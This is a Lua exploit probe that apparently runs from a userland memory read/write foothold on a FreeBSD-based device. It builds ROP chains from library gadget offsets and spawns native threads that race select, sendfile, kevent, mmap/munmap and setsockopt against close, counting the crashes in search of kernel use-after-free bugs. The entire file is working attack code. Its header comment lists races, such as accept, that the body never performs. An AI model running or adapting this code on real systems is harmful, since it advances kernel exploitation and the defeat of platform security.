-- CRASH_CLASS: HIGH
-- PROBE 93d0: dual child thread races at native speed
--
-- Previous races used slow Lua main thread vs fast ROP child.
-- This probe uses TWO ROP children racing each other:
-- A) select(93) + close race (different code path than poll)
-- B) sendfile(393) + close race on shm fd
-- C) accept(30) + close race on listening socket
-- D) kevent(363) + close race on kqueue fd
-- E) recvfrom + setsockopt(SO_RCVBUF) concurrent from two children

print("=== PROBE 93d0: DUAL CHILD THREAD RACES ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_buf = memory.alloc(32)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)   -- pop rax; ret
local pdr_lo, pdr_hi = eoff(0xC9DFE) -- pop rdi; ret
local psr_lo, psr_hi = eoff(0xD77D)  -- pop rsi; ret
local prdx_lo, prdx_hi = eoff(0x3B02D7) -- pop rdx; ret
local bret_lo, bret_hi = eoff(0x42)  -- bare ret
local mwr_lo, mwr_hi = eoff(0x92C67) -- mov [rdi], rax; ret
local stub_lo, stub_hi = split(stub)
local pr8_lo, pr8_hi = eoff(0x991)   -- pop r8; ret
local prc_lo, prc_hi = eoff(0xE64)   -- pop rcx; ret

-- Generic child spawner: takes a list of {syscall_no, a1, a2, a3, a4, a5} calls
local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x100)
    local tcb_a = N(tcb)
    local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)

    local stk = memory.alloc(0x200000)
    local sb = N(stk)
    local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end

    -- sysarch(SET_FSBASE=129, &tcb)
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)

    for _, c in ipairs(calls) do
        local a1_lo, a1_hi = split(c[2] or 0)
        local a2_lo, a2_hi = split(c[3] or 0)
        local a3_lo, a3_hi = split(c[4] or 0)
        local a4_lo, a4_hi = split(c[5] or 0)
        local a5_lo, a5_hi = split(c[6] or 0)
        put(pdr_lo, pdr_hi); put(a1_lo, a1_hi)
        put(psr_lo, psr_hi); put(a2_lo, a2_hi)
        put(prdx_lo, prdx_hi); put(a3_lo, a3_hi)
        put(prc_lo, prc_hi); put(a4_lo, a4_hi)
        put(pr8_lo, pr8_hi); put(a5_lo, a5_hi)
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end

    -- done marker + exit
    put(par_lo, par_hi); put(0xDEAD93D0, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)

    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(done_addr, max_iter)
    for w = 1, (max_iter or 50000) do
        local df = rd(done_addr)
        if df and df ~= 0 then return true end
    end
    return false
end

-- ========== SECTION A: select + close race (two children) ==========
print("--- A: select + close race (two children) ---")

local RACES = 30
local a_crashes = 0

for race = 1, RACES do
    -- Create target fd (socketpair)
    local sv = memory.alloc(8)
    local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
    if sp ~= 0 then break end
    local rfd = rd(N(sv)) or -1
    local wfd = rd(N(sv) + 4) or -1

    -- fd_set for select: bit array, fd/32 dword index, fd%32 bit
    local readfds = memory.alloc(128)  -- 1024 bits
    for i = 0, 124, 4 do wd(N(readfds) + i, 0) end
    local dword_idx = math.floor(rfd / 32) * 4
    local bit_pos = rfd % 32
    wd(N(readfds) + dword_idx, 2^bit_pos)

    -- timeval {0, 100000} = 100ms timeout
    local tv = memory.alloc(16)
    wq(N(tv), uint64(0))      -- tv_sec
    wq(N(tv) + 8, uint64(100000))  -- tv_usec

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: select(rfd+1, &readfds, NULL, NULL, &tv) x 50
    local child1_calls = {}
    for i = 1, 50 do
        -- Reset the fd_set bit before each select
        child1_calls[#child1_calls + 1] = {93, rfd + 1, N(readfds), 0, 0, N(tv)}
    end

    -- Child 2: close(rfd) then close(wfd) then open new sockets
    local child2_calls = {}
    -- Small delay via getpid calls
    for i = 1, 10 do child2_calls[#child2_calls + 1] = {20, 0, 0, 0, 0, 0} end
    child2_calls[#child2_calls + 1] = {6, rfd, 0, 0, 0, 0}  -- close rfd
    child2_calls[#child2_calls + 1] = {6, wfd, 0, 0, 0, 0}  -- close wfd
    -- Open new sockets to reclaim fd numbers
    for i = 1, 5 do
        local sv_new = memory.alloc(8)
        child2_calls[#child2_calls + 1] = {135, 1, 1, 0, N(sv_new), 0}
    end

    local ok1 = spawn_child(child1_calls, N(done1))
    local ok2 = spawn_child(child2_calls, N(done2))

    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    if not alive() then
        a_crashes = a_crashes + 1
        print(string.format("  [CRASH!] race %d", race))
        break
    end
end
print(string.format("select+close: %d races, %d crashes", RACES, a_crashes))

if not alive() then print("DEAD!"); return end

-- ========== SECTION B: sendfile + close on shm fd ==========
print("")
print("--- B: sendfile + close on shm fd ---")

local b_crashes = 0

for race = 1, RACES do
    -- shm fd
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(0x202), uint64(0x1FF))
    end)
    if not ok_s then break end
    local shm_fd = N(rv_s)
    if shm_fd < 0 then break end
    pcall(function() mk(480)(uint64(shm_fd), uint64(0x4000)) end)  -- ftruncate 16K

    -- Output socket
    local sv = memory.alloc(8)
    local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
    if sp ~= 0 then break end
    local rfd = rd(N(sv)) or -1
    local wfd = rd(N(sv) + 4) or -1

    local sbytes = memory.alloc(8)
    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: sendfile(shm_fd, wfd, 0, 0x4000, NULL, &sbytes, 0) x 20
    local c1_calls = {}
    for i = 1, 20 do
        c1_calls[#c1_calls + 1] = {393, shm_fd, wfd, 0, 0x4000, 0}
    end

    -- Child 2: close shm_fd, close sockets
    local c2_calls = {}
    for i = 1, 5 do c2_calls[#c2_calls + 1] = {20, 0, 0, 0, 0, 0} end
    c2_calls[#c2_calls + 1] = {6, shm_fd, 0, 0, 0, 0}
    c2_calls[#c2_calls + 1] = {6, wfd, 0, 0, 0, 0}
    c2_calls[#c2_calls + 1] = {6, rfd, 0, 0, 0, 0}

    spawn_child(c1_calls, N(done1))
    spawn_child(c2_calls, N(done2))

    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    if not alive() then
        b_crashes = b_crashes + 1
        print(string.format("  [CRASH!] race %d", race))
        break
    end
end
print(string.format("sendfile+close: %d races, %d crashes", RACES, b_crashes))

if not alive() then print("DEAD!"); return end

-- ========== SECTION C: kevent + close kqueue fd ==========
print("")
print("--- C: kevent + close kqueue fd ---")

local c_crashes = 0

for race = 1, RACES do
    -- kqueue
    local ok_k, rv_k = pcall(function() return mk(362)() end)
    if not ok_k then break end
    local kq = N(rv_k)
    if kq < 0 then break end

    -- kevent struct for registering a timer: 48 bytes
    -- {ident=1, filter=EVFILT_TIMER(-7), flags=EV_ADD(1)|EV_ENABLE(4), fflags=0, data=1000, udata=0}
    local kev = memory.alloc(48)
    wq(N(kev), uint64(1))           -- ident
    wd(N(kev) + 8, 0xFFF9)          -- filter = -7 (EVFILT_TIMER) as int16
    wd(N(kev) + 10, 0x0005)         -- flags = EV_ADD|EV_ENABLE
    wd(N(kev) + 12, 0)              -- fflags
    wq(N(kev) + 16, uint64(1000))   -- data = 1000ms
    wq(N(kev) + 24, uint64(0))      -- udata

    -- Register timer
    pcall(function() mk(363)(uint64(kq), kev, uint64(1), uint64(0), uint64(0), uint64(0)) end)

    local out_kev = memory.alloc(48)
    local ts = memory.alloc(16)
    wq(N(ts), uint64(0))
    wq(N(ts) + 8, uint64(100000000))  -- 100ms

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: kevent(kq, NULL, 0, out, 1, &ts) x 30
    local c1_calls = {}
    for i = 1, 30 do
        c1_calls[#c1_calls + 1] = {363, kq, 0, 0, N(out_kev), 1}
    end

    -- Child 2: close kq
    local c2_calls = {}
    for i = 1, 3 do c2_calls[#c2_calls + 1] = {20, 0, 0, 0, 0, 0} end
    c2_calls[#c2_calls + 1] = {6, kq, 0, 0, 0, 0}

    spawn_child(c1_calls, N(done1))
    spawn_child(c2_calls, N(done2))

    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    if not alive() then
        c_crashes = c_crashes + 1
        print(string.format("  [CRASH!] race %d", race))
        break
    end
end
print(string.format("kevent+close_kq: %d races, %d crashes", RACES, c_crashes))

if not alive() then print("DEAD!"); return end

-- ========== SECTION D: mmap + munmap race on same addr ==========
print("")
print("--- D: mmap + munmap race (vm_map corruption) ---")

local d_crashes = 0

for race = 1, RACES do
    -- mmap a page
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_m then break end
    local addr = N(rv_m)
    if addr == 0 then break end

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: munmap(addr, 0x4000) then mmap at same addr x 20
    local c1_calls = {}
    for i = 1, 20 do
        c1_calls[#c1_calls + 1] = {73, addr, 0x4000, 0, 0, 0}  -- munmap
        c1_calls[#c1_calls + 1] = {477, addr, 0x4000, 3, 0x1012, 0xFFFFFFFF}  -- mmap MAP_FIXED|MAP_ANON|MAP_PRIVATE
    end

    -- Child 2: same thing, racing
    local c2_calls = {}
    for i = 1, 20 do
        c2_calls[#c2_calls + 1] = {73, addr, 0x4000, 0, 0, 0}
        c2_calls[#c2_calls + 1] = {477, addr, 0x4000, 3, 0x1012, 0xFFFFFFFF}
    end

    spawn_child(c1_calls, N(done1))
    spawn_child(c2_calls, N(done2))

    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    if not alive() then
        d_crashes = d_crashes + 1
        print(string.format("  [CRASH!] race %d", race))
        break
    end

    -- Cleanup
    pcall(function() mk(73)(uint64(addr), uint64(0x4000)) end)
end
print(string.format("mmap+munmap_race: %d races, %d crashes", RACES, d_crashes))

if not alive() then print("DEAD!"); return end

-- ========== SECTION E: setsockopt from two children simultaneously ==========
print("")
print("--- E: dual setsockopt race (SO_SNDBUF + SO_RCVBUF) ---")

local e_crashes = 0

for race = 1, RACES do
    local sv = memory.alloc(8)
    local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
    if sp ~= 0 then break end
    local rfd = rd(N(sv)) or -1
    local wfd = rd(N(sv) + 4) or -1

    local opt_big = memory.alloc(4); wd(N(opt_big), 65536)
    local opt_small = memory.alloc(4); wd(N(opt_small), 1)

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: toggle SO_SNDBUF between 65536 and 1, 100 times
    local c1_calls = {}
    for i = 1, 100 do
        c1_calls[#c1_calls + 1] = {105, wfd, 0xFFFF, 0x1001, N(opt_big), 4}
        c1_calls[#c1_calls + 1] = {105, wfd, 0xFFFF, 0x1001, N(opt_small), 4}
    end

    -- Child 2: toggle SO_RCVBUF on same socket simultaneously
    local c2_calls = {}
    for i = 1, 100 do
        c2_calls[#c2_calls + 1] = {105, wfd, 0xFFFF, 0x1002, N(opt_big), 4}
        c2_calls[#c2_calls + 1] = {105, wfd, 0xFFFF, 0x1002, N(opt_small), 4}
    end

    spawn_child(c1_calls, N(done1))
    spawn_child(c2_calls, N(done2))

    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    pcall(function() mk(6)(uint64(wfd)) end)
    pcall(function() mk(6)(uint64(rfd)) end)

    if not alive() then
        e_crashes = e_crashes + 1
        print(string.format("  [CRASH!] race %d", race))
        break
    end
end
print(string.format("dual_setsockopt: %d races, %d crashes", RACES, e_crashes))

print("")
local total = a_crashes + b_crashes + c_crashes + d_crashes + e_crashes
print(string.format("TOTAL CRASHES: %d", total))
print("alive=" .. tostring(alive()))
print("=== 93d0 COMPLETE ===")
